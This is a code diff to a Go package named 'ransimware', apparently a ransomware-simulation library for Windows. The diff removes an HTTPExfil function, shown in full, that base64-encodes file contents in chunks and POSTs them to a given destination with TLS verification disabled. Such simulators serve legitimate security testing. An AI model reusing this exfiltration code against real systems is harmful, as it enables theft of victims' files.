@@ -3,22 +3,18 @@
 package ransimware
 
 import (
-	"bytes"
 	"encoding/base64"
 	"encoding/binary"
-	"io"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
-	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 
 	"github.com/mjwhitta/errors"
-	http "github.com/mjwhitta/win/wininet"
 )
 
 func executeBat(
@@ -266,45 +262,6 @@ func executeShell(shell string, cmds []string) (string, error) {
 	}
 
 	return strings.Join(out, "\n"), nil
-}
-
-// HTTPExfil will return a function pointer to an ExfilFunc that
-// exfils via HTTP POST requests with the specified headers.
-func HTTPExfil(
-	dst string,
-	headers map[string]string,
-) (ExfilFunc, error) {
-	var f ExfilFunc = func(path string, b []byte) error {
-		var b64 string
-		var data []byte
-		var e error
-		var n int
-		var r *http.Request
-		var stream *bytes.Reader = bytes.NewReader(b)
-		var tmp [4 * 1024 * 1024]byte
-
-		http.DefaultClient.TLSClientConfig.InsecureSkipVerify = true
-		http.DefaultClient.Timeout = time.Second
-
-		for {
-			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
-				return nil
-			} else if e != nil {
-				return errors.Newf("failed to read data: %w", e)
-			}
-
-			// Create request
-			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
-			data = []byte(path + " " + b64)
-			r = http.NewRequest(http.MethodPost, dst, data)
-			r.Headers = headers
-
-			// Send Message and ignore response or errors
-			http.DefaultClient.Do(r)
-		}
-	}
-
-	return f, nil
 }
 
 // WallpaperNotify is a NotifyFunc that sets the background wallpaper.
